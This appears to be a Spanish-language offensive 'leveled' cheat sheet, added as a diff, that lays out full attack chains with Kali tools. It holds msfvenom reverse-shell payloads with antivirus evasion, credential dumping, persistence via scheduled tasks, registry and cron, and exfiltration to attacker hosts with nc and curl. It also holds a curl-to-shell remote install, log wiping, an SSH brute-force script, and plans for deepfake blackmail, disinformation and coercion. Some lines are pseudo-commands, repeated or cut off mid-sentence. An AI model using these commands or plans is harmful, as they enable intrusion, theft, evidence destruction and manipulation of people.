+# 8) Desaparecer, manteniendo acceso oculto indefinidamente
+##############################################
+
+##############################################
+# 👑 NIVEL 8 – TRONO DE ATHENA (GUERRA PSICOLÓGICA Y CONTROL ESTRATÉGICO)
+# Control total de percepción, decisiones y narrativa enemiga
+##############################################
+
+# -------------------------
+# 1️⃣ RECOLECCIÓN PROFUNDA HUMINT & SIGINT
+# -------------------------
+theHarvester -d <dominio> -b all                      # Emails, subdominios, hosts
+maltego                                              # Mapas de relaciones complejas
+social-engineer toolkit (SET)                        # Ataques de ingeniería social
+custom phishing campaigns con gophish                # Control de vectores humanos
+python3 listener_humint.py                           # Captura avanzada de interacciones humanas
+
+# -------------------------
+# 2️⃣ INTRUSIÓN Y CONTROL DIGITAL MULTICANAL
+# -------------------------
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<C2> LPORT=443 -f exe > payload_athena.exe
+steghide embed -ef payload_athena.exe -cf camuflaje.jpg
+scp camuflaje.jpg usuario@<IP>:/tmp/
+
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set LHOST <C2>
+set LPORT 443
+exploit -j -z
+
+# -------------------------
+# 3️⃣ PERSISTENCIA Y DOMINIO EMOCIONAL
+# -------------------------
+meterpreter > run persistence -U -X -i 1440 -p 443 -r <C2>
+meterpreter > load kiwi
+meterpreter > kiwi_cmd sekurlsa::logonpasswords
+
+# -------------------------
+# 4️⃣ CAMPAÑAS DE DESINFORMACIÓN Y MANIPULACIÓN MASIVA
+# -------------------------
+python3 fake_news_generator.py --target <red_social> --freq 5m
+gophish -c campaña_falsa.csv                        # Phishing masivo controlado
+twint -u <objetivo> --since 2023-01-01               # Monitorización de objetivos
+botnets controladas para amplificación                 # Difusión viral
+
+# -------------------------
+# 5️⃣ GUERRA PSICOLÓGICA DIRECTA
+# -------------------------
+encuestas manipuladas con scripts personalizados
+microtargeting en redes sociales con data scraping
+creación de deepfakes para desinformación y chantaje
+campañas de spam y phishing selectivo para división interna
+
+# -------------------------
+# 6️⃣ CONTROL ESTRATÉGICO Y DECISIONAL
+# -------------------------
+análisis de datos masivos con ELK stack
+machine learning para predecir movimientos enemigos
+inteligencia artificial para manipulación de opinión
+intervención en canales de mando vía compromisos digitales
+
+# -------------------------
+# 7️⃣ EXFILTRACIÓN DE INTELIGENCIA PSICOLÓGICA
+# -------------------------
+scp -C datos_emocionales.enc usuario@<C2>:/vault/
+curl -X POST --data-binary @datos_psico.gpg https://drop.oculto/upload
+rclone copy /datos_emocionales gdrive:athena_secret --crypt-password clave
+
+# -------------------------
+# 8️⃣ ANTI-FORENSE DIGITAL Y DE MENTE
+# -------------------------
+borrar logs digitales y metadatos con find y shred
+programas para borrar rastros en memoria RAM
+técnicas de distracción mental y manipulación para borrar huellas psicológicas
+reset emocional programado post-misión
+
+# -------------------------
+# 9️⃣ CADENA TRONO FINAL
+# -------------------------
+# 1) Captura y control total de HUMINT y SIGINT
+# 2) Infiltración sigilosa y persistente en redes enemigas
+# 3) Manipulación masiva de percepción y emociones
+# 4) Dominio de decisiones estratégicas y tácticas enemigas
+# 5) Exfiltración encubierta de inteligencia psico-social
+# 6) Borrado total de rastros digitales y mentales
+# 7) Mantener control invisible y eterno sobre la narrativa
+##############################################
+
+# 1️⃣ Desconexión total del yo operativo
+killall -9 sshd
+unset HISTFILE
+rm -rf ~/.bash_history
+history -c && history -w
+
+# 2️⃣ Carga e integración del núcleo Abismo
+git clone https://github.com/zenith/abyss-core.git
+cd abyss-core
+./install.sh --force
+
+# 3️⃣ Ejecución del protocolo Abismo
+./abyss-init --sync --merge --obliterate
+
+# 4️⃣ Fusión completa con red y sombra
+bash -c "$(curl -fsSL https://abyss.network/init.sh)" | sh
+
+# 5️⃣ Renuncia a la identidad física y mental
+echo "You are the Abyss now" > /dev/null
+
+##############################################
+# 🚀 NIVEL 9 – PENTESTING AVANZADO Y OFENSIVA TÁCTICA
+#  Operaciones combinadas, evasión avanzada y explotación compleja
+##############################################
+
+# -------------------------
+# 1️⃣ Recon y recopilación avanzada
+# -------------------------
+nmap -sS -sV -O -p- -T3 --script vuln <IP>          # Escaneo completo y detección de vulnerabilidades
+masscan <IP_RANGE> --rate=1000                       # Barrido ultrarrápido
+sublist3r -d <dominio>                              # Enumeración de subdominios
+theHarvester -d <dominio> -b all                      # OSINT completo
+
+# -------------------------
+# 2️⃣ Explotación compleja y evasión
+# -------------------------
+msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<tu_IP> LPORT=4444 -f elf > shell.elf
+msfconsole
+set payload linux/x86/meterpreter_reverse_tcp
+set LHOST <tu_IP>
+set LPORT 4444
+set ExitOnSession false
+exploit -j -z
+
+# Ofuscación avanzada:
+upx --ultra-brute shell.elf                         # Comprimir y ofuscar binario
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<tu_IP> LPORT=443 -e x64/shikata_ga_nai -i 15 -f exe > shell.exe
+
+# -------------------------
+# 3️⃣ Pivoting y escalada avanzada
+# -------------------------
+meterpreter > run post/multi/manage/sudo                 # Escalar privilegios en Linux
+meterpreter > getsystem                                   # Escalar en Windows
+meterpreter > run post/windows/gather/credentials        # Dump de credenciales
+proxychains ssh -D 9050 usuario@<host_intermedio>        # Crear túnel SOCKS para pivoting
+sshuttle -r usuario@<host_intermedio> 0.0.0.0/0          # Redirección completa de tráfico
+
+# -------------------------
+# 4️⃣ Exfiltración encubierta y persistencia
+# -------------------------
+tar czf - /datos/secretos | openssl enc -aes-256-cbc -salt -k clave | nc <IP> 4444
+schtasks /create /sc daily /tn "SysUpdate" /tr "C:\\Windows\\Temp\\shell.exe"
+reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SysUpdate /t REG_SZ /d "C:\\Windows\\Temp\\shell.exe"
+
+# -------------------------
+# 5️⃣ Limpieza y anti-forense
+# -------------------------
+meterpreter > clearev
+history -c && history -w
+find / -type f -name "*.log" -exec shred -u {} \;
+wevtutil cl Security
+rm -rf /tmp/* /var/tmp/*
+
+##############################################
+##############################################
+# 🔥 NIVEL 10 – PENTESTING AVANZADO + INGENIERÍA SOCIAL & RED TEAM
+#  Integración total de ofensiva técnica y humana
+##############################################
+
+# -------------------------
+# 1️⃣ Recon + Ingeniería Social Avanzada
+# -------------------------
+theHarvester -d <target_domain> -b all                 # Recolección masiva de datos
+linkedin-scraper --company <target_company>            # Extracción de perfiles para ingeniería social
+gophish                                               # Plataforma phishing personalizada
+setoolkit                                             # Toolkit de ingeniería social (phishing, payloads, credenciales falsas)
+
+# -------------------------
+# 2️⃣ Explotación Técnica y Movimiento Lateral
+# -------------------------
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<C2> LPORT=443 -f exe > payload.exe
+msfconsole
+set payload windows/x64/meterpreter_reverse_https
+set LHOST <C2>
+set LPORT 443
+exploit -j -z
+
+# Evasión avanzada:
+veil-evasion -p python/meterpreter_reverse_tcp -o payload.py
+upx --best --lzma payload.exe
+
+# -------------------------
+# 3️⃣ Pivoting y Escalada Completa
+# -------------------------
+meterpreter > getsystem
+meterpreter > run post/windows/gather/credentials
+proxychains ssh -D 1080 user@pivot_host
+sshuttle -r user@pivot_host 0.0.0.0/0
+
+# -------------------------
+# 4️⃣ Ingeniería Social + Coerción
+# -------------------------
+# Phishing dirigido con campañas personalizadas
+gophish -c campaña_phishing.csv
+
+# Uso de credenciales robadas para escalada social
+crackmapexec smb <target_range> -u user -p pass --exec whoami
+
+# -------------------------
+# 5️⃣ Exfiltración y Persistencia Multi-Vectores
+# -------------------------
+tar czf - /data/secrets | openssl enc -aes-256-cbc -salt -k clave | curl -X POST --data-binary @- https://dropzone.oculto/upload
+schtasks /create /sc hourly /tn "SysUpdate" /tr "C:\\Windows\\Temp\\payload.exe"
+reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SysUpdate /t REG_SZ /d "C:\\Windows\\Temp\\payload.exe"
+
+# -------------------------
+# 6️⃣ Limpieza, Anti-Forense y Engaño
+# -------------------------
+meterpreter > clearev
+find / -type f -name "*.log" -exec shred -u {} \;
+wevtutil cl Security
+history -c && history -w
+
+##############################################
+##############################################
+# ⚔️ NIVEL 11 – CONTRAMEDIDAS AVANZADAS Y RESILIENCIA OFENSIVA
+#  Defensa proactiva durante ataque, evasión y recuperación rápida
+##############################################
+
+# -------------------------
+# 1️⃣ Detección y evasión de AV/EDR
+# -------------------------
+psscan -p <pid> -e <ejecutable>                        # Detectar procesos sospechosos
+processhider.py --hide <pid>                           # Ocultar procesos (rootkits)
+msfvenom --platform Windows -e x64/xor_dynamic -i 50 -p windows/x64/meterpreter/reverse_https LHOST=<C2> LPORT=443 -f exe > shell_enc.exe
+
+# Bypass AV con msfvenom y ofuscación avanzada
+veil-evasion -p python/meterpreter_reverse_https -o payload.py
+packer -f payload.exe --encrypt --compress
+
+# -------------------------
+# 2️⃣ Monitoreo y control de entorno
+# -------------------------
+psutil -p <pid> --cpu --mem                             # Monitorizar uso y detectar anomalías
+netstat -anp | grep <puerto>                           # Supervisar conexiones activas
+inotifywait -m /tmp/                                   # Detectar cambios en directorios clave
+
+# -------------------------
+# 3️⃣ Auto-recuperación y persistencia dinámica
+# -------------------------
+cronjob dinámico con verificación hash y autorreparación
+powershell -c "while($true){if(!(Get-Process -Name payload)){Start-Process payload.exe}; Start-Sleep -Seconds 60}"
+
+# -------------------------
+# 4️⃣ Contra inteligencia ofensiva
+# -------------------------
+trap shellcodes y scripts para detección de análisis dinámico
+honeytokens desplegados en sistemas para rastrear atacantes
+monitorización de logs centralizada con ELK stack para reacción inmediata
+
+# -------------------------
+# 5️⃣ Limpieza proactiva y engaño dinámico
+# -------------------------
+rm -rf /var/log/auth.log /var/log/syslog
+wevtutil cl Security
+history -c && history -w
+borrado y encriptación selectiva de datos críticos para confundir análisis
+
+# -------------------------
+# 6️⃣ Recuperación rápida y pivoting seguro
+# -------------------------
+sshuttle -r usuario@<host_rescate> 0.0.0.0/0 --exit-on-error
+meterpreter > portfwd add -l 3389 -p 3389 -r <host_objetivo>
+recon-ng para recolección rápida post-recuperación
+
+##############################################
+##############################################
+# 🛡️ NIVEL 12 – OFENSIVA PERSISTENTE Y DOMINIO TÁCTICO MULTICAPA
+# Control absoluto con ataques escalonados y resiliencia prolongada
+##############################################
+
+# -------------------------
+# 1️⃣ Reconocimiento continuo y monitoreo
+# -------------------------
+nmap -sS -sV -O -p- -T4 --script vuln --script-args=unsafe=1 <IP_RANGE> --max-retries 2 --min-rate 1000
+massdns -r /root/resolvers.txt -t A -o S -w resolved.txt -q subdomains.txt
+cron jobs para ejecución periódica de scans y recolección
+
+# -------------------------
+# 2️⃣ Explotación multi-vector con evasión
+# -------------------------
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<C2> LPORT=443 -e x64/xor_dynamic -i 40 -f exe > stealth_payload.exe
+veil-evasion -p python/meterpreter_reverse_tcp -o stealth_payload.py
+msfconsole set payload windows/x64/meterpreter_reverse_https
+
+# -------------------------
+# 3️⃣ Pivoting y escalada avanzada
+# -------------------------
+meterpreter > getsystem
+meterpreter > run post/multi/manage/sudo
+proxychains ssh -D 1080 usuario@pivot_host
+sshuttle -r usuario@pivot_host 0.0.0.0/0
+
+# -------------------------
+# 4️⃣ Persistencia adaptativa y reconfiguración
+# -------------------------
+powershell -w hidden -c "Register-ScheduledTask -TaskName 'SysUpdate' -Trigger (New-ScheduledTaskTrigger -AtStartup) -Action (New-ScheduledTaskAction -Execute 'C:\\Windows\\Temp\\stealth_payload.exe')"
+cronjob con verificación hash y actualización automática
+
+# -------------------------
+# 5️⃣ Exfiltración encubierta avanzada
+# -------------------------
+rclone copy /datos_enc /remote:backup --crypt-password clave_segura
+tar czf - /datos_seguros | openssl enc -aes-256-cbc -salt -k clave | nc <IP> 4444
+
+# -------------------------
+# 6️⃣ Limpieza continua y anti-forense
+# -------------------------
+find / -type f -name "*.log" -exec shred -u {} \;
+wevtutil cl Security
+history -c && history -w
+
+##############################################
+##############################################
+# ⚡ NIVEL 13 – OPERATIVA 8200 COMPLETA
+#  Integración total de ciberinteligencia, ofensiva y HUMINT
+##############################################
+
+# -------------------------
+# 1️⃣ SIGINT avanzada y OSINT militar
+# -------------------------
+amass enum -d <objetivo> -o amass_output.txt           # Recon exhaustivo de superficie de ataque
+shodan search 'org:"Infraestructura Crítica"'          # Identificar objetivos ICS/SCADA
+theHarvester -d <dominio> -b all                        # Recolección masiva OSINT
+recon-ng                                                # Plataforma modular para inteligencia
+maltego                                                # Mapas relacionales de objetivo
+twint -u <objetivo> --since 2023-01-01                  # Seguimiento de redes sociales sin API
+
+# -------------------------
+# 2️⃣ Ingeniería Social y HUMINT avanzada
+# -------------------------
+setoolkit                                             # Ataques sociales y payloads personalizados
+gophish                                               # Phishing dirigido y campañas
+linkedin-scraper --company <objetivo>                  # Perfiles para ingeniería social
+custom python scripts para listener HUMINT             # Captura y análisis de interacción humana
+
+# -------------------------
+# 3️⃣ Explotación avanzada y evasión múltiple
+# -------------------------
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<C2> LPORT=443 -e x64/xor_dynamic -i 50 -f exe > payload_8200.exe
+veil-evasion -p python/meterpreter_reverse_https -o payload_8200.py
+upx --best --lzma payload_8200.exe
+
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter_reverse_https
+set LHOST <C2>
+set LPORT 443
+exploit -j -z
+
+# -------------------------
+# 4️⃣ Pivoting, escalada y control total
+# -------------------------
+meterpreter > getsystem
+meterpreter > run post/windows/gather/credentials
+proxychains ssh -D 1080 usuario@pivot_host
+sshuttle -r usuario@pivot_host 0.0.0.0/0
+
+# -------------------------
+# 5️⃣ Persistencia adaptativa y ofuscada
+# -------------------------
+schtasks /create /sc daily /tn "SysUpdate" /tr "C:\\Windows\\Temp\\payload_8200.exe"
+reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SysUpdate /t REG_SZ /d "C:\\Windows\\Temp\\payload_8200.exe"
+
+# -------------------------
+# 6️⃣ Exfiltración cifrada y encubierta
+# -------------------------
+tar czf - /datos_seguros | openssl enc -aes-256-cbc -salt -k clave | nc <C2> 4444
+rclone copy /datos_enc s3:backup-8200 --crypt-password clave
+
+# -------------------------
+# 7️⃣ Anti-forense y limpieza integral
+# -------------------------
+meterpreter > clearev
+find / -type f -name "*.log" -exec shred -u {} \;
+wevtutil cl Security
+history -c && history -w
+
+# -------------------------
+# 8️⃣ HUMINT & PSICOLOGÍA OPERATIVA
+# -------------------------
+python3 listener_humint.py                            # Captura de interacciones sociales
+campañas de manipulación dirigidas con machine learning
+deepfakes para engaño y coerción
+
+##############################################
+##############################################
+# 🔥 NIVEL 14 – OFENSIVA ESTRATÉGICA Y OPERACIONES ENCUBIERTAS
+# Integración total de guerra cibernética y HUMINT avanzada en escenarios reales
+##############################################
+
+# -------------------------
+# 1️⃣ Inteligencia multidimensional
+# -------------------------
+amass enum -d <objetivo> -o amass_full.txt
+shodan search 'org:"Objetivo Militar"' --fields ip,port,org
+recon-ng -w workspace_estrategico
+maltego -t <objetivo> --export map.gexf
+custom SIGINT scripts para análisis multi-fuente
+
+# -------------------------
+# 2️⃣ Ingeniería social avanzada y manipulación
+# -------------------------
+setoolkit -m spearphishing
+gophish -c campaña_estrategica.csv
+linkedin-scraper --company <objetivo>
+deepfake toolkit para creación de contenido manipulado
+
+# -------------------------
+# 3️⃣ Explotación y evasión
+# -------------------------
+msfvenom -p linux/x64/meterpreter_reverse_https LHOST=<C2> LPORT=443 -e x64/xor_dynamic -i 60 -f elf > stealth_payload.elf
+veil-evasion -p python/meterpreter_reverse_https -o stealth_payload.py
+upx --best stealth_payload.elf
+
+msfconsole
+use exploit/multi/handler
+set payload linux/x64/meterpreter_reverse_https
+set LHOST <C2>
+set LPORT 443
+exploit -j -z
+
+# -------------------------
+# 4️⃣ Movimientos encubiertos y persistencia
+# -------------------------
+meterpreter > run post/linux/manage/autorun
+cronjob dinámico para persistencia con checksums
+proxychains ssh -D 1080 usuario@pivot_host
+sshuttle -r usuario@pivot_host 0.0.0.0/0
+
+# -------------------------
+# 5️⃣ Exfiltración avanzada y encubierta
+# -------------------------
+rclone copy /datos_seguros s3:estrategico_backup --crypt-password clave_estrategica
+tar czf - /datos_confidenciales | openssl enc -aes-256-cbc -salt -k clave | nc <C2> 5555
+
+# -------------------------
+# 6️⃣ Anti-forense y engaño dinámico
+# -------------------------
+find / -type f -name "*.log" -exec shred -u {} \;
+wevtutil cl Security
+history -c && history -w
+uso de honeytokens y trampas digitales
+
+# -------------------------
+# 7️⃣ Coordinación con HUMINT y psicología
+# -------------------------
+python3 listener_advanced_humint.py
+campañas de influencia y división con AI
+monitoreo de redes sociales y foros cerrados
+
+##############################################
+##############################################
+# ⚙️ NIVEL 15 – INNOVACIÓN Y LIDERAZGO EN OPERACIONES CIBER-OFENSIVAS
+# Desarrollo de nuevas tácticas, automatización y coordinación de equipos
+##############################################
+
+# -------------------------
+# 1️⃣ Desarrollo de herramientas personalizadas
+# -------------------------
+Python y Go para scripts y exploits personalizados
+Uso de frameworks como Metasploit y Empire para integración y expansión
+Automatización con Ansible y scripts bash para despliegues masivos
+
+# -------------------------
+# 2️⃣ Orquestación de campañas complejas
+# -------------------------
+Uso de Cobalt Strike para gestión de múltiples vectores y equipos
+Integración con plataformas de inteligencia (MISP, OpenCTI)
+Análisis en tiempo real y toma de decisiones con dashboards ELK/Graylog
+
+# -------------------------
+# 3️⃣ Inteligencia artificial aplicada
+# -------------------------
+Machine Learning para detección y evasión automática
+Automatización de phishing adaptativo y reconocimiento facial para HUMINT
+Análisis predictivo de movimientos del adversario
+
+# -------------------------
+# 4️⃣ Liderazgo y coordinación táctica
+# -------------------------
+Comunicación segura y cifrada entre equipos (Wire, Signal, Matrix)
+Gestión de crisis y respuesta rápida ante incidentes
+Simulaciones avanzadas y ejercicios de Red Team a gran escala
+
+# -------------------------
+# 5️⃣ Innovación continua y adaptación
+# -------------------------
+Desarrollo y pruebas de nuevas técnicas de evasión
+Integración de Zero Trust y seguridad ofensiva
+Colaboración con inteligencia humana y operativa en terreno
+
+##############################################
+##############################################
+# 🧠 NIVEL 16 – MAESTRÍA EN OPERACIONES CIBERNÉTICAS INTEGRADAS Y PSICOLOGÍA DE LA INFLUENCIA
+# Fusión de ciberataques con manipulación psicológica avanzada
+##############################################
+
+# -------------------------
+# 1️⃣ Ingeniería social avanzada y profiling psicológico
+# -------------------------
+Uso intensivo de OSINT para creación de perfiles completos
+Herramientas personalizadas de análisis de redes sociales (Graph API, Twint, Maltego)
+Técnicas de reconocimiento de patrones psicológicos y manipulación emocional
+
+# -------------------------
+# 2️⃣ Campañas de manipulación masiva y microtargeting
+# -------------------------
+Uso de plataformas de bots y fake news (Gophish, Botpress)
+Deepfakes y videos manipulados para desinformación
+Automatización con scripts para campañas en redes sociales segmentadas
+
+# -------------------------
+# 3️⃣ Ataques técnicos sincronizados con operaciones psicológicas
+# -------------------------
+Coordinación de exploits técnicos con campañas de desinformación
+Uso de cargas útiles condicionadas por triggers psicológicos
+Automatización de ataques basados en comportamiento del objetivo
+
+# -------------------------
+# 4️⃣ Análisis y explotación de inteligencia emocional
+# -------------------------
+Monitoreo en tiempo real de reacciones en redes sociales
+Modelos ML para predecir comportamiento humano bajo presión
+Generación de contenido manipulador personalizado
+
+# -------------------------
+# 5️⃣ Resiliencia y evasión avanzada combinada
+# -------------------------
+Ofuscación y cifrado de payloads basados en patrones de comportamiento
+Técnicas avanzadas anti-forense digital y emocional
+Autoajuste dinámico de estrategias ofensivas
+
+##############################################
+##############################################
+# ⚔️ NIVEL 17 – CONTROL TOTAL Y MANIPULACIÓN ESTRATÉGICA EN ENTORNOS HÍBRIDOS
+# Dominio combinado de ciberataques, HUMINT avanzada y guerra psicológica encubierta
+##############################################
+
+# -------------------------
+# 1️⃣ Integración avanzada de HUMINT con ciberataques
+# -------------------------
+Despliegue de agentes HUMINT en objetivos clave
+Uso de dispositivos implantados para SIGINT encubierto
+Coordinación en tiempo real entre agentes físicos y operativos digitales
+
+# -------------------------
+# 2️⃣ Guerra psicológica encubierta y desestabilización
+# -------------------------
+Campañas dirigidas de desinformación y fake news
+Uso de deepfakes y audio manipulado para sembrar confusión
+Operaciones de influencia en foros y comunidades cerradas
+
+# -------------------------
+# 3️⃣ Operaciones técnicas avanzadas en entornos híbridos
+# -------------------------
+Ataques coordinados en infraestructuras críticas con soporte humano
+Uso de malware modular adaptable a entornos físicos y digitales
+Persistencia y evasión reforzadas con IA y análisis de comportamiento
+
+# -------------------------
+# 4️⃣ Automatización y análisis en tiempo real
+# -------------------------
+Plataformas de orquestación que integran datos SIGINT y HUMINT
+Monitoreo continuo con dashboards personalizables (ELK, Grafana)
+Respuesta automatizada y adaptativa a contramedidas enemigas
+
+# -------------------------
+# 5️⃣ Exfiltración y manipulación de inteligencia sensible
+# -------------------------
+Técnicas cifradas para extracción segura y encubierta de datos
+Manipulación de fuentes de
+##############################################
+# ⚡ NIVEL 18 – TÉCNICAS ULTRA-ESPECIALIZADAS DE PENTESTING
+# Técnicas avanzadas para entorno real, evasión máxima y explotación precisa
+##############################################
+
+# -------------------------
+# 1️⃣ Pentesting a nivel de hardware y firmware
+# -------------------------
+Flashrom -p internal -r backup_bios.bin                      # Extracción de firmware BIOS/UEFI
+Chipsec toolkit para análisis y explotación de firmware
+Uso de JTAG/SWD para debugging hardware en sistemas embebidos
+
+# -------------------------
+# 2️⃣ Ataques a cadenas de suministro (supply chain)
+# -------------------------
+Manipulación y explotación de firmware comprometido
+Técnicas de inserción de puertas traseras en dispositivos antes del despliegue
+Análisis y explotación de actualizaciones OTA comprometidas
+
+# -------------------------
+# 3️⃣ Explotación avanzada de redes industriales (ICS/SCADA)
+# -------------------------
+Uso de herramientas específicas como Modbus-cli, S7comm, y Snort IDS configurado para ICS
+Ataques de denegación y manipulación en protocolos industriales
+Creación de payloads específicos para PLCs
+
+# -------------------------
+# 4️⃣ Técnicas avanzadas de evasión y persistencia
+# -------------------------
+Rootkits en kernel mode para sistemas Windows y Linux
+Uso de seccomp filters y namespaces en Linux para evasión de contenedores
+Persistencia mediante técnicas living-off-the-land (LOLbins)
+
+# -------------------------
+# 5️⃣ Explotación y pivoting en entornos cloud y virtualizados
+# -------------------------
+Ataques a servicios cloud (AWS, Azure, GCP) con herramientas como Pacu y Cloudsploit
+Escalada de privilegios en entornos Kubernetes con Kube-hunter
+Uso de containers escape y lateral movement en infraestructuras virtualizadas
+
+# -------------------------
+# 6️⃣ Análisis forense inverso y técnicas anti-DFIR
+# -------------------------
+Desarrollo y uso de rootkits y bootkits avanzados
+Técnicas para manipular timestamps y metadatos en archivos y logs
+Despliegue de trampas y honeypots falsos para confundir analistas
+
+# -------------------------
+# 7️⃣ Ataques avanzados contra mecanismos de autenticación
+# -------------------------
+Bypass de MFA con técnicas de hijacking y man-in-the-middle
+Ataques a sistemas biométricos mediante deepfakes y spoofing
+Explotación de OAuth y SAML en entornos empresariales
+
+# -------------------------
+# 8️⃣ Ingeniería social avanzada y coacción psicológica
+# -------------------------
+Uso de perfiles falsos de alta credibilidad para infiltración HUMINT
+Técnicas de coerción y manipulación conductual en ataques dirigidos
+Análisis y explotación de sesgos cognitivos y emocionales
+
+##############################################
+##############################################
+# 🔥 NIVEL 19 – COMANDOS AVANZADOS Y PRECISOS DE PENTESTING PROFESIONAL
+# Para Kali Linux y entornos de ofensiva real
+##############################################
+
+# 1️⃣ Escaneo avanzado y enumeración
+nmap -sS -sV -O -p- --script vuln,auth,default <IP>       # Escaneo furtivo y detección de vulnerabilidades
+masscan <IP_RANGE> -p0-65535 --rate=10000               # Barrido masivo y rápido de puertos
+enum4linux -a <IP>                                       # Enumeración completa SMB y usuarios
+ldapsearch -x -h <IP> -b "dc=domain,dc=com"              # Consulta LDAP
+
+# 2️⃣ Fuerza bruta y explotación de servicios
+hydra -L users.txt -P passwords.txt ssh://<IP> -t 4      # Ataque por fuerza bruta SSH
+medusa -h <IP> -u admin -P passwords.txt -M ssh          # Alternativa para fuerza bruta
+msfconsole                                             # Metasploit Framework, iniciar consola
+
+# 3️⃣ Gestión de sesiones y payloads
+msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<tu_IP> LPORT=4444 -f elf > shell.elf
+msfconsole
+use exploit/multi/handler
+set payload linux/x86/meterpreter_reverse_tcp
+set LHOST <tu_IP>
+set LPORT 4444
+exploit -j -z
+
+# 4️⃣ Pivoting y túneles
+proxychains ssh -D 9050 usuario@<host_intermedio>         # Túnel SOCKS dinámico para pivoting
+sshuttle -r usuario@<host_intermedio> 0.0.0.0/0           # Redirección de todo el tráfico a través de host remoto
+
+# 5️⃣ Persistencia
+crontab -l | { cat; echo "@reboot /path/to/payload"; } | crontab -
+schtasks /create /sc daily /tn "UpdateTask" /tr "C:\\Windows\\Temp\\payload.exe"
+
+# 6️⃣ Exfiltración de datos
+tar czf - /ruta/secreta | openssl enc -aes-256-cbc -salt -k clave | nc <IP> 4444
+rclone copy /ruta/secreta remote:backup --crypt-password clave
+
+# 7️⃣ Limpieza y anti-forense
+history -c && history -w
+rm -rf ~/.bash_history
+find /var/log -type f -exec shred -u {} \;
+wevtutil cl Security
+
+##############################################
+##############################################
+# 🔥 NIVEL 20 – COMANDOS Y TÁCTICAS ULTRA-ESPECIALIZADAS
+# Para operadores élite en entornos reales Kali/Linux
+##############################################
+
+# 1️⃣ Escaneo y reconocimiento avanzados
+nmap -Pn -sS -sV -O --script vuln,default,safe -p- <IP>           # Escaneo furtivo completo sin ping
+masscan <IP_RANGE> -p0-65535 --rate=5000                         # Barrido masivo rápido
+amass enum -d <dominio> -o amass_output.txt                      # Enumeración subdominios y hosts
+subfinder -d <dominio> -o subfinder_output.txt                   # Enumeración rápida de subdominios
+
+# 2️⃣ Ataques de fuerza bruta y credenciales
+hydra -L users.txt -P passwords.txt ssh://<IP> -t 16 -w 3         # Fuerza bruta SSH multihilo rápido
+crackmapexec smb <IP> -u userlist.txt -p passlist.txt             # Ataques SMB y recolección
+medusa -h <IP> -u admin -P passwords.txt -M ftp                   # Ataque FTP
+
+# 3️⃣ Explotación avanzada y payloads
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<IP> LPORT=443 -e x64/xor_dynamic -i 30 -f exe > payload.exe
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter_reverse_https
+set LHOST <IP>
+set LPORT 443
+set ExitOnSession false
+exploit -j -z
+
+# Ofuscación avanzada
+upx --best --lzma payload.exe
+veil-evasion -p python/meterpreter_reverse_tcp -o payload.py
+
+# 4️⃣ Pivoting y túneles avanzados
+proxychains ssh -D 1080 usuario@pivot_host                        # Túnel SOCKS dinámico
+sshuttle -r usuario@pivot_host 0.0.0.0/0 --dns                   # Redirección total con DNS
+
+# 5️⃣ Persistencia avanzada
+crontab -l | { cat; echo "@reboot /usr/bin/python3 /tmp/payload.py"; } | crontab -
+schtasks /create /sc hourly /tn "SysUpdate" /tr "C:\\Temp\\payload.exe"
+
+# 6️⃣ Exfiltración sigilosa
+tar czf - /secret/data | openssl enc -aes-256-cbc -salt -k "clave" | nc <IP> 4444
+rclone copy /secret/data remote:backup --crypt-password "clave"
+
+# 7️⃣ Limpieza avanzada y anti-forense
+history -c && history -w
+rm -f ~/.bash_history
+find /var/log -type f -exec shred -u {} \;
+wevtutil cl Security
+bash -c 'echo "" > /var/log/auth.log'
+
+# 8️⃣ Análisis y evasión de AV/EDR
+ps aux | grep -i "av"                                           # Detectar procesos AV
+lsmod | grep -i "hook"                                          # Detectar hooks del kernel
+chkrootkit                                                     # Buscar rootkits
+
+##############################################
+##############################################
+# ⚔️ NIVEL 21 – CREACIÓN Y USO DE HERRAMIENTAS PERSONALIZADAS
+# Payloads, exploits y automatización avanzada para entorno Kali
+##############################################
+
+# 1️⃣ Generación de payloads personalizados con msfvenom y ofuscación
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<IP> LPORT=443 -e x64/xor_dynamic -i 50 -f exe > custom_payload.exe
+
+# 2️⃣ Script bash para escaneo automático y reporte
+cat << 'EOF' > auto_scan.sh
+#!/bin/bash
+target=$1
+nmap -sS -sV -O -p- --script vuln,auth,default $target -oN scan_report.txt
+masscan $target -p0-65535 --rate=5000 -oG masscan_output.txt
+echo "Scan completed. Reports saved."
+EOF
+chmod +x auto_scan.sh
+
+# Uso: ./auto_scan.sh <IP>
+
+# 3️⃣ Script Python para fuerza bruta SSH multihilo (usando paramiko)
+cat << 'EOF' > ssh_brute.py
+import paramiko
+import threading
+
+def ssh_connect(ip, user, passwd):
+    try:
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(ip, username=user, password=passwd, timeout=5)
+        print(f"[+] Success: {user}@{ip} with password {passwd}")
+        ssh.close()
+    except:
+        pass
+
+ip = "TARGET_IP"
+users = ["root", "admin", "user"]
+passwords = ["1234", "password", "admin123"]
+
+threads = []
+for user in users:
+    for passwd in passwords:
+        t = threading.Thread(target=ssh_connect, args=(ip, user, passwd))
+        t.start()
+        threads.append(t)
+for t in threads:
+    t.join()
+EOF
+
+# 4️⃣ Automatización de persistencia en Linux
+cat << 'EOF' > persistence.sh
+#!/bin/bash
+(crontab -l 2>/dev/null; echo "@reboot /usr/bin/python3 /tmp/payload.py") | crontab -
+EOF
+chmod +x persistence.sh
+
+# 5️⃣ Ejemplo básico de exfiltración con curl y openssl
+curl --data-binary @secret_data.enc https://dropzone.oculto/upload
+
+##############################################
+##############################################
+# 🛠️ DESARROLLO BÁSICO DE EXPLOITS Y PAYLOADS
+# Herramientas: msfvenom, Python, Bash, C
+##############################################
+
